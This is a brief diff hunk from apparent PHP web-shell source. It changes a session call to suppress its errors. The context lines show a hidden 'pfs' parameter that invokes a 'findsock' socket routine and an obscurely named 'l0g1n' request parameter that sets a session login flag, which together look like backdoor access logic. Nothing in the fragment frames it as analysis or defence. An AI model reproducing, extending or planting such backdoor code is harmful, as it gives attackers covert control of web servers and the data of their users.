@@ -8,7 +8,7 @@ if(isset($_GET['pfs'])) {
  }
  findsock($path);
 }
-session_start();
+@session_start();
 if(isset($_REQUEST['l0g1n'])) {
  $_SESSION['l0g1n']=session_id();;
 }
